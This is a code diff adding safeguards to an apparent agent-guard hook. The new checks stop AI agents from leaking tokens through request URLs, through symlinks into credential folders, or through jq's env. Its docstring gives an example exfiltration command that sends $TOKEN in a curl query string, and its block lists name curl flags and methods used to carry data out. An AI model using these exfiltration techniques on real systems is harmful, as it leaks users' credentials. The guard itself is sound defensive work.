@@ -25,10 +25,26 @@ variable, which later commands don't see unless NAME is already exported, so it'
 the name is dangerous (see `dangerous`). `for NAME in`, `read NAME` and `printf -v NAME` assign
 too and get the same check.
 
+Reading a variable is checked as well, because a variable's value can leave in a request URL just
+as a file's can: `curl "https://host/?k=$TOKEN"`. A command may expand only variables it sets
+itself (by assignment, `for`, `read` or `printf -v`) and a few harmless ones the shell keeps
+(SAFE_VARS). Indirect expansion (`${!name}`) and jq's `env` and `$ENV` are refused outright.
+
+Paths are compared after resolving symlinks too, so a link that points into ~/.aws is refused
+like ~/.aws itself.
+
+Request URLs are limited in size, since a GET request's URL is where data would leave: a host
+name of at most MAX_HOST characters, at most MAX_AFTER_HOST after it, no user name or password
+in the URL, and no curl or gh argument over MAX_ARG characters. Real requests stay well inside
+these (the longest in the agents' transcripts to 2026-09-24 had a 43-character host and 206
+characters after it). It doesn't stop a leak, it slows one to a few hundred characters a request.
+The WebFetch tool gets the same check through the `fetch` mode.
+
 Usage, from an agent's frontmatter hooks:
   agent-guard.py bash            Bash tool
   agent-guard.py read            Read, Grep and Glob tools: no credentials
   agent-guard.py write <dir>     Write/Edit tools: allow only files under <dir>
+  agent-guard.py fetch           WebFetch tool: the URL size limits
 
 Reads the hook's JSON on stdin. Exit 0 allows; exit 2 blocks and tells the agent why on stderr.
 """
@@ -39,6 +55,7 @@ import re
 import shlex
 import sys
 from pathlib import Path
+from urllib.parse import urlsplit
 from typing import NoReturn
 
 HOME = Path.home()
@@ -92,6 +109,13 @@ DANGEROUS_PREFIXES = (
     "GH_",
     "CLAUDE",
 )
+# Variables any command may expand: the shell sets them, and they hold no secrets.
+SAFE_VARS = {
+    "HOME", "PWD", "OLDPWD", "RANDOM", "LINENO", "SECONDS", "EPOCHSECONDS", "EPOCHREALTIME",
+    "PPID", "UID", "EUID", "TMPDIR", "REPLY", "OPTARG", "OPTIND",
+}  # fmt: skip
+JQ_STRING = re.compile(r'"(?:\\.|[^"\\])*"')
+VAR_REF = re.compile(r"\$\{?([A-Za-z_]\w*)")
 # `read` options that take a value; -a's value is an array name, so it's checked too.
 READ_ARG_OPTS = set("adinNptu")
 CLOUD = {
@@ -150,8 +174,12 @@ CURL_BLOCK_SHORT = set("oOcKTdFD")
 CURL_BLOCK_LONG = (
     "--output", "--remote-name", "--output-dir", "--dump-header", "--cookie-jar", "--config",
     "--upload-file", "--data", "--json", "--form", "--create-dirs", "--trace", "--libcurl",
-    "--stderr", "--etag-save", "--hsts", "--alt-svc",
+    "--stderr", "--etag-save", "--hsts", "--alt-svc", "--url-query", "--variable", "--expand-",
 )  # fmt: skip
+# URL size limits: see the module docstring.
+MAX_HOST, MAX_AFTER_HOST, MAX_ARG = 80, 400, 450
+URL_IN_WORD = re.compile(r"[a-zA-Z][\w+.-]*://[^\s'\"<>]+")
+BARE_HOST = re.compile(r"[\w-]+(?:\.[\w-]+)+(?::\d+)?(?:[/?#].*)?")
 PUNCT = set("();<>|&")
 # Credentials no agent needs to read. A fetched page can still make an agent send data out in a
 # GET request's URL, so the data it can reach is what has to be limited. Keep the home entries in
@@ -221,6 +249,81 @@ def substitutions(command):
             expands = True
         i += 1
     return subs, expands
+
+
+def variable_refs(command):
+    """Names of the variables a command expands outside single quotes, and whether it uses
+    indirect expansion (`${!name}`), which can reach any variable. Substitutions are skipped
+    here, as in `substitutions`: check_command checks each one on its own."""
+    names, indirect, i, quote = set(), False, 0, None
+    while i < len(command):
+        ch = command[i]
+        if quote == "'":
+            quote = None if ch == "'" else quote
+        elif ch == "\\":
+            i += 1
+        elif ch == "'" and quote is None:
+            quote = "'"
+        elif ch == '"':
+            quote = None if quote == '"' else '"'
+        elif ch == "`":
+            end = command.find("`", i + 1)
+            i = end if end > 0 else len(command)
+        elif ch in "$<" and command[i + 1 : i + 2] == "(":
+            depth, j = 1, i + 2
+            while j < len(command) and depth:
+                depth += {"(": 1, ")": -1}.get(command[j], 0)
+                j += 1
+            i = j - 1
+        elif ch == "$":
+            if command[i + 1 : i + 3] == "{!":
+                indirect = True
+            elif m := VAR_REF.match(command, i):
+                names.add(m.group(1))
+        i += 1
+    return names, indirect
+
+
+def assigned_names(command, depth=0):
+    """Variables a command sets itself: by assignment, `for`, `select`, `read` or `printf -v`,
+    here or in any $(...) inside it. Generous on purpose: it only decides which variables the
+    command may expand, and setting a dangerous one is refused elsewhere."""
+    if depth > 4:
+        return set()
+    names = set()
+    for sub in substitutions(command)[0]:
+        names |= assigned_names(sub, depth + 1)
+    for raw in simple_commands(tokens(command)):
+        words = list(raw)
+        while words and (words[0] in KEYWORDS or ASSIGNMENT.fullmatch(words[0])):
+            if m := ASSIGNMENT.fullmatch(words[0]):
+                names.add(m.group(1))
+            words = words[1:]
+        if not words:
+            continue
+        name, args = os.path.basename(words[0]), words[1:]
+        if name in ("for", "select") and args:
+            names.add(args[0])
+        elif name == "read":
+            names.update(read_variables(args))
+        elif name == "printf":
+            for k, arg in enumerate(args[:-1]):
+                if arg == "-v":
+                    names.add(args[k + 1])
+    return names
+
+
+def check_variables(command, local):
+    """Refuse expanding a variable the command didn't set: it may hold a token."""
+    names, indirect = variable_refs(command)
+    if indirect:
+        block("indirect expansion (`${!name}`) can read any variable; not allowed")
+    if outside := sorted(names - local - SAFE_VARS):
+        block(
+            f"`${outside[0]}` expands a variable this command didn't set. Environment variables "
+            "can hold tokens, which could leave in a request URL; set your own variables in "
+            "the same command, with lowercase names"
+        )
 
 
 def tokens(command):
@@ -374,6 +477,9 @@ def check_gh(args, raw, expands):
         block(f"`gh {' '.join(sub)}` can change GitHub; only read commands are allowed")
     if sub[:1] != ("api",):
         return
+    check_request_words(args, "gh")
+    if any(a.startswith("--hostname") for a in args):
+        block("`gh api --hostname` sends the request, and maybe a token, to another host")
     method = None
     for i, arg in enumerate(args):
         if arg in ("-X", "--method") and i + 1 < len(args):
@@ -390,6 +496,8 @@ def check_gh(args, raw, expands):
         if a.startswith(("-f", "-F", "--field", "--raw-field", "--input"))
     ]
     endpoint = next((a for a in args[1:] if not a.startswith("-")), "")
+    if endpoint and endpoint != "graphql" and "://" not in endpoint:
+        check_url("https://api.github.com/" + endpoint.lstrip("/"))
     if endpoint != "graphql":
         if fields and not method:
             block(
@@ -448,7 +556,57 @@ def check_git(args):
         block("`git reflog` may only show the reflog")
 
 
+def check_url(url):
+    """Refuse a URL whose shape could carry data out: see the module docstring."""
+    try:
+        parts = urlsplit(url if "://" in url else "http://" + url)
+        host = parts.hostname or ""
+    except ValueError:
+        block(f"couldn't parse the URL {url[:80]!r}")
+    if parts.username or parts.password:
+        block("a user name or password in a URL can carry data out; not allowed")
+    if len(host) > MAX_HOST or any(len(label) > 63 for label in host.split(".")):
+        block(
+            f"the host name is {len(host)} characters; over {MAX_HOST}, a host name can carry "
+            "data out"
+        )
+    after = len(url) - url.find(parts.netloc) - len(parts.netloc)
+    if after > MAX_AFTER_HOST:
+        block(
+            f"the URL has {after} characters after the host, over the {MAX_AFTER_HOST} "
+            "allowed: a long URL can carry data out. Fetch the page without the extra "
+            "query, or split the search into shorter ones"
+        )
+
+
+def check_request_words(args, tool):
+    """Size limits on every word of a curl or gh command, and on each URL in it. gh's --jq
+    and --template values are exempt: gh applies them to the reply, they're never sent."""
+    local = {"--jq", "-q", "--template", "-t"} if tool == "gh" else set()
+    for k, arg in enumerate(args):
+        if arg.startswith(("--jq=", "--template=")) and tool == "gh":
+            continue
+        if k and args[k - 1] in local:
+            continue
+        if len(arg) > MAX_ARG:
+            block(
+                f"a {tool} argument of {len(arg)} characters, over the {MAX_ARG} allowed: "
+                "long arguments can carry data out in a request"
+            )
+        for url in URL_IN_WORD.findall(arg):
+            check_url(url)
+        if "://" not in arg and not arg.startswith("-") and BARE_HOST.fullmatch(arg):
+            check_url(arg)
+
+
 def check_curl(args):
+    check_request_words(args, "curl")
+    if any(
+        (a.startswith("--write-out") or re.fullmatch(r"-[a-zA-Z]*w.*", a) or a == "-w")
+        and "%output{" in " ".join(args)
+        for a in args
+    ):
+        block("`curl -w '%output{…}'` writes a file; these agents only read")
     method, i = None, 0
     while i < len(args):
         arg = args[i]
@@ -553,6 +711,28 @@ def check_reader(name, args):
         block("`base64 -o` writes a file")
     elif name == "rg" and any(a.startswith("--pre") for a in args):
         block("`rg --pre` runs another program")
+    if name == "jq":
+        if any(
+            a.startswith("--from-file") or re.fullmatch(r"-[a-zA-Z]*f[a-zA-Z]*", a)
+            for a in args
+        ):
+            block("`jq -f` reads its filter from a file, which can't be checked; give it inline")
+        for arg in args:
+            if arg.startswith("-") or os.path.lexists(absolute(arg)):
+                continue
+            # Words inside a jq string are text, unless the string interpolates with \(...).
+            code = arg if "\\(" in arg else JQ_STRING.sub('""', arg)
+            if re.search(r"\$ENV\b|(?<![\w$.])env\b(?!\w)", code):
+                block("jq's `env` and `$ENV` read environment variables, which can hold tokens")
+    if name in ("grep", "egrep", "fgrep", "rg") and any(
+        (name != "rg" and (a == "--dereference-recursive" or re.fullmatch(r"-[a-zA-Z]*[RS][a-zA-Z]*", a)))
+        or (name == "rg" and (a == "--follow" or re.fullmatch(r"-[a-zA-Z]*L[a-zA-Z]*", a)))
+        for a in args
+    ):
+        block(
+            f"`{name}` following symlinks can reach credentials through a link; use -r, which "
+            "doesn't follow them"
+        )
 
 
 def expand_home(text):
@@ -585,6 +765,17 @@ def secret_path(path):
     return None
 
 
+def secret_reason(path):
+    """Why a path is a secret, judged as written and with symlinks resolved. realpath resolves
+    the links that exist even when the file itself doesn't."""
+    if reason := secret_path(path):
+        return reason
+    if (real := os.path.realpath(path)) != path:
+        if reason := secret_path(real):
+            return f"it links to {real}: {reason}"
+    return None
+
+
 def secret_word(word):
     """Why a command word names a secret file or directory, or None.
 
@@ -611,15 +802,16 @@ def secret_word(word):
         path = absolute(text)
         if not pathlike and not os.path.lexists(path):
             continue
-        if reason := secret_path(path):
+        if reason := secret_reason(path):
             return reason
     return None
 
 
 def ancestor_of_secret(path):
     """True if a directory holds a credentials directory, so a recursive read reaches it."""
+    paths = {path, os.path.realpath(path)}
     return any(
-        under(str(secret), path) and str(secret) != path for secret in SECRET_HOME
+        under(str(secret), p) and str(secret) != p for secret in SECRET_HOME for p in paths
     )
 
 
@@ -663,13 +855,19 @@ def check_secrets(raw, argv):
 
 
 def check_read(tool_name, tool_input):
-    """Read, Grep and Glob: the same secrets, from the tool's own path argument. Glob lists
-    names only, so it's refused only inside a credentials directory, not above one."""
+    """Read, Grep and Glob: the same secrets, from the tool's own path argument, and for Glob
+    the fixed part of its pattern. Glob lists names only, so it's refused only inside a
+    credentials directory, not above one."""
     path = tool_input.get("file_path") or tool_input.get("path") or ""
+    if tool_name == "Glob" and (pattern := tool_input.get("pattern", "")):
+        glob_at = next((i for i, ch in enumerate(pattern) if ch in "*?[{"), len(pattern))
+        stem = absolute(os.path.join(absolute(path or "."), expand_home(pattern[:glob_at])))
+        if reason := secret_reason(stem):
+            block(f"{reason}. These agents may not read secrets")
     if not path:
         return
     target = absolute(path)
-    if reason := secret_path(target):
+    if reason := secret_reason(target):
         block(f"{reason}. These agents may not read secrets")
     if tool_name == "Grep" and ancestor_of_secret(target):
         block(
@@ -678,12 +876,15 @@ def check_read(tool_name, tool_input):
         )
 
 
-def check_command(command, depth=0):
+def check_command(command, depth=0, local=None):
     if depth > 4:
         block("commands nested too deeply to check")
+    if local is None:
+        local = assigned_names(command)
+    check_variables(command, local)
     subs, expands = substitutions(command)
     for sub in subs:
-        check_command(sub, depth + 1)
+        check_command(sub, depth + 1, local)
     for raw in simple_commands(tokens(command)):
         argv = unwrap(raw)
         check_secrets(raw, argv)
@@ -702,13 +903,13 @@ def check_command(command, depth=0):
             continue
         if name in ("python3", "python", "bash", "sh", "zsh") and args:
             if args[0] == "-c" and name in ("bash", "sh", "zsh") and len(args) > 1:
-                check_command(args[1], depth + 1)
+                check_command(args[1], depth + 1, local | assigned_names(args[1]))
                 continue
             if Path(args[0]).expanduser().resolve() in SCRIPTS:
                 continue
             block(f"`{name}` may only run the /research and /spec skill scripts")
         if name == "eval":
-            check_command(" ".join(args), depth + 1)
+            check_command(" ".join(args), depth + 1, local)
             continue
         if "/" in word and path.parent not in (
             Path("/bin"),
@@ -757,6 +958,8 @@ def main():
         check_command(tool_input.get("command", ""))
     elif mode == "read":
         check_read(event.get("tool_name", ""), tool_input)
+    elif mode == "fetch":
+        check_url(tool_input.get("url", ""))
     elif mode == "write" and len(sys.argv) > 2:
         check_write(tool_input.get("file_path", ""), sys.argv[2])
     else:
